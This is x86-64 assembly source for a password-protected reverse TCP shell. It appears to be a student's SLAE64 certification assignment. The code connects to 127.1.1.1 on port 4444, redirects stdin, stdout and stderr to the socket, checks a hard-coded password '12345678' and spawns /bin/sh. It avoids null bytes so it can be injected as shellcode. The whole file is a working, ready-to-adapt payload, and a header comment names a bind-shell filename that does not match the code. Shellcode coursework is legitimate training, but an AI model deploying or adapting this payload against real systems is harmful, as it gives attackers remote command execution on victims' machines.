; Author: Guillem Alminyana
; Student ID: PA-14628
; SLAE64 Assignment #2: Reverse_TCP_Shell
; =======================================
;
; Compile: 
;   nasm -f elf64 BindShell-Execve-Stack_V2.nasm -o BindShell-Execve-Stack_V2.o 

global _start

%define AF_INET 2
%define SOCK_STREAM 1

%define PORT 0x5c11			; Port 4444

section .text

_start:

	; sock = socket(AF_INET, SOCK_STREAM, 0)
	; AF_INET = 2
	; SOCK_STREAM = 1
	; syscall number 41 

	push 41
	pop rax

	push AF_INET
	pop rdi

	push SOCK_STREAM
	pop rsi

	cdq				; RDX <- 0

	syscall

	; RDI <- socket_id for future use
	push rax
	pop rdi

	; Prepare the struct for connect
	;     server.sin_family = AF_INET 
	;     server.sin_port = htons(PORT)
	;     server.sin_addr.s_addr = inet_addr("127.1.1.1")
	;	(An IP adress with 0, will put NULLs)
	;     bzero(&server.sin_zero, 8)

	push rdx				; RDX Zeroed before
						; Pushing bzero in the stack
	
	push dword 0x0101017f			; Addr: 127.1.1.1
						; Used this address to avoid NULLs

	push word 0x5c11			; Port 4444

	push word AF_INET			; TCP connection

	; connect(sock, (struct sockaddr *)&server, sockaddr_len)
	
	push 42					; Syscall number 
	pop rax

	push rsp				; & struct
	pop rsi

	push 16					; struct length
	pop rdx
	
	syscall

        ; dup2 (new, old)
	;     old 
        
	;rdi points to the socket_id
	push 2
	pop rsi
loop_1:
	push 33
	pop rax

	syscall

	dec rsi
	jns loop_1

password_check:

write_syscall:
        ; rdi still has right value for socket_id
	push 1                                    ; Syscall number for write()
	pop rax

	mov r9, "Passwd: "
	push r9

	push rsp
	pop rsi

	push 8					   ; Length of "Passwd: "
	pop rdx

	syscall

read_syscall:
        ; rdi still has right value for socket_id
	; rdx has value of 8
	
	xor rax, rax				     ; Syscall number for read()
	
	; Where to store the input passwd
	add rsi, 8				      ; Replace "Passwd: " with the input in the stack

	syscall

compare_passwords:

	mov rax, "12345678"			; Thgis is the password

	push rsi				; rsi points to PASSWD_INPUT
	pop rdi

	scasq
	jne exit_program			; Passwords don't match, exit

execve_syscall:

	; Syscall number 59 for execve into rax
	push 59
	pop rax

        ; First NULL push
	cdq					; RDX<-0 as rax>=0
	push rdx

        ; push /bin//sh in reverse
        mov rbx, 0x68732f2f6e69622f		; /bin//sh in reverse hex
        push rbx

        ; store /bin//sh address in RDI
	push rsp
	pop rdi

        ; Second NULL push
        push rdx

        ; set RDX
	push rsp
	pop rdx

        ; Push address of /bin//sh
        push rdi

        ; set RSI
	push rsp
	pop rsi

        ; Call the Execve syscall

        syscall

exit_program:
